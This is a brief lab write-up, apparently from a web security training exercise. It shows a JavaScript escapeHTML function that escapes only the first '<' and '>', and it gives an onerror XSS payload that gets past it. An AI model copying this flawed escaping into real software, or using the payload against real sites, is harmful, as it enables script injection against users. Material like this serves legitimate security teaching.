# Lab: Reflected DOM XSS
## Description

JS file `/resources/js/loadCommentsWithVulnerableEscapeHtml.js`
```js
function loadComments(postCommentPath) {
	[..SNIPPET..]
    function escapeHTML(html) {
        return html.replace('<', '&lt;').replace('>', '&gt;');
    }
	[..SNIPPET..]
};
``` 

The `escapeHTML()` is only filtering `< >` once. We can therefore do something like this to bypass the filert: `<><img src=# onerror=alert(1)>`


## Solution

`<><img src=# onerror=alert(1)>`
